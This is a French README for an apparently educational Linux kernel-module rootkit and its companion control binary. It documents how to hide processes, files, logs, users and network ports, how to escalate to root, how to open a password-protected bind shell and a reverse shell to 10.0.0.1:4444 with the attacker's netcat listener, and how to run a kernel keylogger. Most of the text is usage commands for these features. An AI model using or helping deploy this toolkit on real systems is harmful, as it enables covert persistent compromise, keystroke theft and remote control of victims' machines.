# Rootkit Linux - Module Noyau Educatif

Projet educatif de developpement d'un rootkit sous forme de module noyau Linux (LKM).
Le rootkit utilise **ftrace** pour hooker les appels systeme et **kprobes** pour resoudre les symboles noyau.

**Architecture** : x86-64  
**Interface** : peripherique misc `/dev/rootkit` + commandes ioctl  
**Acces** : restreint aux UID 0 (root) et 1000  

## Compilation

```bash
make        # compile le module rootkit.ko et le binaire rootkit_malware
make clean  # nettoie les fichiers generes
```

## Chargement / Dechargement

```bash
sudo insmod rootkit.ko    # charger le module
sudo rmmod rootkit         # decharger le module
```

## Programme compagnon (userspace)

Le binaire `rootkit_malware` permet de controler le rootkit depuis l'espace utilisateur :

```bash
./rootkit_malware <commande> [arguments]
```

---

## Fonctionnalites

### 1. Dissimulation de processus (multi-PID)

Masque jusqu'a **16 processus** simultanement dans `/proc`. Les entrees correspondantes sont filtrees du syscall `getdents64`, rendant les processus invisibles a `ps`, `top`, `htop`, etc.

```bash
./rootkit_malware hide_pid 1234      # cacher un processus
./rootkit_malware hide_pid 5678      # cacher un deuxieme processus
./rootkit_malware unhide_pid 1234    # rendre un processus visible a nouveau
```

**Hook** : `__x64_sys_getdents64`  
**ioctl** : `RK_CMD_HIDE_PID` (1), `RK_CMD_UNHIDE_PID` (10)

---

### 2. Dissimulation de fichiers et services

Filtre automatiquement les entrees de repertoire correspondant au nom du module (`rootkit`) et au service cache (`network-helper.service`) dans tous les listings de repertoire.

**Hook** : `__x64_sys_getdents64`

---

### 3. Dissimulation du module noyau

Deux mecanismes complementaires :

- **Liste chainee** : `list_del_init()` retire le module de la liste des modules noyau, le rendant invisible a `lsmod`
- **Kobject** : `kobject_del()` supprime l'entree `/sys/module/rootkit`
- **Filtrage /proc/modules** : le hook `read` supprime la ligne du module dans `/proc/modules`

Le module se cache **automatiquement au chargement**.

```bash
./rootkit_malware hide_mod     # cacher le module (fait automatiquement)
./rootkit_malware show_mod     # rendre le module visible (necessaire avant rmmod)
```

**ioctl** : `RK_CMD_HIDE_MODULE` (6), `RK_CMD_SHOW_MODULE` (7)

---

### 4. Dissimulation de la persistance

Filtre les lectures du fichier `/etc/rc.local` pour supprimer toute ligne contenant `insmod`, masquant ainsi le mecanisme de persistance du rootkit.

**Hook** : `__x64_sys_read`

---

### 5. Dissimulation des logs (dmesg / syslog)

Intercepte les lectures sur `/dev/kmsg`, `/proc/kmsg`, `/var/log/syslog` et `/var/log/kern.log` pour supprimer toute ligne contenant le mot `rootkit`. Empeche `dmesg` de reveler la presence du module.

**Hook** : `__x64_sys_read`

---

### 6. Dissimulation de connexions reseau

#### TCP
Filtre `/proc/net/tcp` pour masquer le port du backdoor des outils comme `netstat`, `ss`, etc.

**Hook** : `tcp4_seq_show`

#### UDP
Filtre egalement `/proc/net/udp` pour une dissimulation complete des connexions reseau.

**Hook** : `udp4_seq_show`

---

### 7. Dissimulation d'utilisateur

Filtre les lectures de `/etc/passwd` et `/etc/shadow` pour supprimer les lignes correspondant a un nom d'utilisateur specifie. L'utilisateur cache devient invisible a `cat /etc/passwd`, `getent passwd`, etc.

```bash
./rootkit_malware hide_user backdoor_user    # cacher un utilisateur
./rootkit_malware unhide_user                # arreter de cacher l'utilisateur
```

**Hook** : `__x64_sys_read`  
**ioctl** : `RK_CMD_HIDE_USER` (11)

---

### 8. Escalade de privileges

Deux methodes d'escalade :

#### Par PID
Utilise `prepare_kernel_cred(NULL)` et `commit_creds()` pour donner les privileges root a un processus specifique.

```bash
./rootkit_malware privesc_pid 1234
```

#### Par commande
Execute une commande arbitraire en tant que root via `call_usermodehelper()`.

```bash
./rootkit_malware privesc_cmd "id > /tmp/proof.txt"
```

**ioctl** : `RK_CMD_PRIVESC` (0)

---

### 9. Backdoor reseau (bind shell)

Ouvre un socket TCP en ecoute sur un port configurable. A la connexion, le client envoie un mot de passe ; si valide, un shell root (`/bin/sh`) est lance via `call_usermodehelper()`.

Le port est automatiquement masque dans `/proc/net/tcp` et `/proc/net/udp`.

```bash
./rootkit_malware backdoor_pass "s3cr3t"    # definir le mot de passe
./rootkit_malware backdoor 4444             # ouvrir le backdoor sur le port 4444
```

Connexion depuis l'attaquant :
```bash
echo "s3cr3t" | nc <cible> 4444
```

**ioctl** : `RK_CMD_OPEN_BACKDOOR` (4), `RK_CMD_SET_BACKDOOR_PASS` (5)

---

### 10. Reverse shell (connexion sortante)

Lance un shell inverse vers une adresse IP et un port specifies. Plus utile que le bind shell lorsque la cible est derriere un NAT ou un pare-feu.

Le shell est lance dans un thread noyau separe via `call_usermodehelper()` avec `/bin/bash`.

```bash
./rootkit_malware revshell 10.0.0.1:4444
```

Cote attaquant, ecouter avec :
```bash
nc -lvnp 4444
```

**ioctl** : `RK_CMD_REVERSE_SHELL` (14)

---

### 11. Keylogger

Enregistre les frappes clavier en s'inscrivant comme handler dans le sous-systeme `input` du noyau. Les scancodes sont convertis en caracteres lisibles (disposition US QWERTY) et stockes dans un buffer circulaire de 4 Ko protege par spinlock.

```bash
./rootkit_malware keylog_toggle    # activer / desactiver le keylogger
./rootkit_malware keylog_read      # lire et vider le buffer de frappes
```

**ioctl** : `RK_CMD_TOGGLE_KEYLOG` (9), `RK_CMD_GET_KEYLOG` (8)

---

### 12. Protection de fichiers

Empeche la suppression (`rm`, `unlink`) et le renommage (`mv`, `rename`) de fichiers critiques en hookant les syscalls `unlinkat` et `renameat2`. Toute tentative retourne `-EACCES`. Supporte jusqu'a **8 fichiers proteges** simultanement.

```bash
./rootkit_malware protect /etc/rc.local     # proteger un fichier
./rootkit_malware protect rootkit.ko        # proteger le module lui-meme
./rootkit_malware unprotect /etc/rc.local   # retirer la protection
```

**Hooks** : `__x64_sys_unlinkat`, `__x64_sys_renameat2`  
**ioctl** : `RK_CMD_PROTECT_FILE` (12), `RK_CMD_UNPROTECT_FILE` (13)

---

### 13. Signal magique (toggle global)

Permet d'activer ou desactiver **toutes les fonctionnalites de dissimulation** du rootkit en envoyant le signal **63** au PID 1. Cette methode ne necessite pas d'acces au peripherique `/dev/rootkit`.

- **ON** : toutes les dissimulations sont actives, le module est cache de `lsmod`
- **OFF** : toutes les dissimulations sont desactivees, le module redevient visible

```bash
./rootkit_malware toggle       # bascule ON/OFF
# ou directement :
kill -63 1
```

**Hook** : `__x64_sys_kill`

---

### 14. Canal de communication secondaire

Permet d'injecter un message dans le fichier `/tmp/.rk_cmd`. Lorsqu'un processus autorise lit ce fichier, le contenu reel est remplace par le message defini via ioctl.

```bash
./rootkit_malware msg "I am Gr00t"
cat /tmp/.rk_cmd    # affiche "I am Gr00t"
```

**ioctl** : `RK_CMD_SET_MSG` (3)

---

### 15. Recuperation de l'UID courant

Commande utilitaire pour verifier l'UID du processus appelant.

```bash
./rootkit_malware uid
```

**ioctl** : `RK_CMD_GETUID` (2)

---

## Resume des hooks syscall

| Hook                       | Syscall / Fonction    | Fonctionnalite                              |
|----------------------------|-----------------------|---------------------------------------------|
| `new_getdents64`           | `__x64_sys_getdents64`| Dissimulation fichiers, services, processus |
| `new_read`                 | `__x64_sys_read`      | Filtrage modules, logs, passwd, persistance |
| `new_tcp4_seq_show`        | `tcp4_seq_show`       | Dissimulation connexions TCP                |
| `new_udp4_seq_show`        | `udp4_seq_show`       | Dissimulation connexions UDP                |
| `new_kill`                 | `__x64_sys_kill`      | Signal magique toggle                       |
| `new_unlinkat`             | `__x64_sys_unlinkat`  | Protection fichiers (suppression)           |
| `new_renameat2`            | `__x64_sys_renameat2` | Protection fichiers (renommage)             |

## Resume des commandes ioctl

| Commande                   | N°  | Direction | Description                          |
|----------------------------|-----|-----------|--------------------------------------|
| `RK_CMD_PRIVESC`           | 0   | W         | Escalade de privileges               |
| `RK_CMD_HIDE_PID`          | 1   | W         | Cacher un PID                        |
| `RK_CMD_GETUID`            | 2   | R         | Lire l'UID courant                   |
| `RK_CMD_SET_MSG`           | 3   | W         | Definir message canal secondaire     |
| `RK_CMD_OPEN_BACKDOOR`     | 4   | WR        | Ouvrir backdoor TCP                  |
| `RK_CMD_SET_BACKDOOR_PASS` | 5   | WR        | Definir mot de passe backdoor        |
| `RK_CMD_HIDE_MODULE`       | 6   | W         | Cacher le module de lsmod            |
| `RK_CMD_SHOW_MODULE`       | 7   | W         | Rendre le module visible             |
| `RK_CMD_GET_KEYLOG`        | 8   | R         | Lire le buffer keylogger             |
| `RK_CMD_TOGGLE_KEYLOG`     | 9   | W         | Activer/desactiver keylogger         |
| `RK_CMD_UNHIDE_PID`        | 10  | W         | Rendre un PID visible                |
| `RK_CMD_HIDE_USER`         | 11  | W         | Cacher un utilisateur                |
| `RK_CMD_PROTECT_FILE`      | 12  | W         | Proteger un fichier                  |
| `RK_CMD_UNPROTECT_FILE`    | 13  | W         | Retirer la protection d'un fichier   |
| `RK_CMD_REVERSE_SHELL`     | 14  | W         | Lancer un reverse shell              |
